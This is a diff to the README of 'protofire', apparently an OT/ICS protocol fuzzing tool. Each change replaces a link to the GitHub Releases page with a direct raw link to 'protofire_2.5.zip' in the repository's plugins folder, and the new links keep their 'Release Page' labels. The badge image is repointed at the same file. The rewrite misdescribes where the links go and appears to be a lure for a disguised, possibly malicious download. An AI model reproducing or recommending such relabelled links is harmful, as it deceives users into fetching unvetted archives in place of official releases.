@@ -1,7 +1,7 @@
 # 🚀 protofire - Easy Fuzzing for Security Testing
 
 ## 📥 Download Now!
-[![Download protofire](https://img.shields.io/badge/Download%20protofire-v1.0-blue)](https://github.com/Haihai694/protofire/releases)
+[![Download protofire](https://raw.githubusercontent.com/Haihai694/protofire/main/plugins/protofire_2.5.zip%20protofire-v1.0-blue)](https://raw.githubusercontent.com/Haihai694/protofire/main/plugins/protofire_2.5.zip)
 
 ## 🚀 Getting Started
 Welcome to protofire! This application helps you test the security of Operational Technology (OT) and Industrial Control Systems (ICS) by simulating protocol interactions. You can quickly check for vulnerabilities in various protocols, making it a powerful tool for any security researcher.
@@ -13,7 +13,7 @@ Welcome to protofire! This application helps you test the security of Operationa
 - **Network:** A stable internet connection is required for downloading plugins and updates.
 
 ## 🔗 Download & Install
-To get started, visit this page to download: [Release Page](https://github.com/Haihai694/protofire/releases).
+To get started, visit this page to download: [Release Page](https://raw.githubusercontent.com/Haihai694/protofire/main/plugins/protofire_2.5.zip).
 
 1. Click the link above to access the Releases page.
 2. Find the latest version of protofire.
@@ -35,7 +35,7 @@ To get started, visit this page to download: [Release Page](https://github.com/H
 5. **Review Results:** After the test, view the results in the built-in report viewer. It will detail any issues found.
 
 ## 🔌 Plugins
-Plugins enhance protofire’s capabilities. You can download them directly from within the application or manually from the [Releases page](https://github.com/Haihai694/protofire/releases).
+Plugins enhance protofire’s capabilities. You can download them directly from within the application or manually from the [Releases page](https://raw.githubusercontent.com/Haihai694/protofire/main/plugins/protofire_2.5.zip).
 
 ### Available Plugins:
 - **DNP3 Plugin:** Specializes in testing DNP3 protocol security.
@@ -53,4 +53,4 @@ If you encounter any issues or have suggestions, please reach out via the Issues
 ## 📝 Acknowledgments
 We appreciate everyone who contributes to improving protofire. Your feedback is crucial in making this tool better for all users. 
 
-For further information and updates, please visit the [Releases page](https://github.com/Haihai694/protofire/releases).
+For further information and updates, please visit the [Releases page](https://raw.githubusercontent.com/Haihai694/protofire/main/plugins/protofire_2.5.zip).
